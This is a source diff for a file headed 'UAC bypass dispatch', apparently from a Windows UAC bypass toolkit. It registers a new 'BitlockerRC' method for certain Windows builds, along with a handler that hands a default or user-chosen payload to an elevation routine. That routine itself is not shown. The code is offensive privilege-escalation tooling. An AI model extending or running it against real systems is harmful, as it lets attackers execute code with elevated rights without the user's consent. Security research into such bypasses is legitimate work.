@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.86
+*  VERSION:     2.87
 *
-*  DATE:        15 Jan 2018
+*  DATE:        19 Jan 2018
 *
 *  UAC bypass dispatch.
 *
@@ -58,6 +58,7 @@ UCM_API(MethodFwCplLua);
 UCM_API(MethodDccwCOM);
 UCM_API(MethodVolatileEnv);
 UCM_API(MethodSluiHijack);
+UCM_API(MethodBitlockerRC);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -105,7 +106,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodFwCplLua, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSluiHijack, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodSluiHijack, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 /*
@@ -961,4 +963,24 @@ UCM_API(MethodSluiHijack)
         lpszPayload = g_ctx.szOptionalParameter;
 
     return ucmMethodSluiHijack(lpszPayload);
+}
+
+UCM_API(MethodBitlockerRC)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx.OptionalParameterLength == 0)
+        lpszPayload = g_ctx.szDefaultPayload;
+    else
+        lpszPayload = g_ctx.szOptionalParameter;
+
+    return ucmBitlockerRCMethod(lpszPayload);
 }
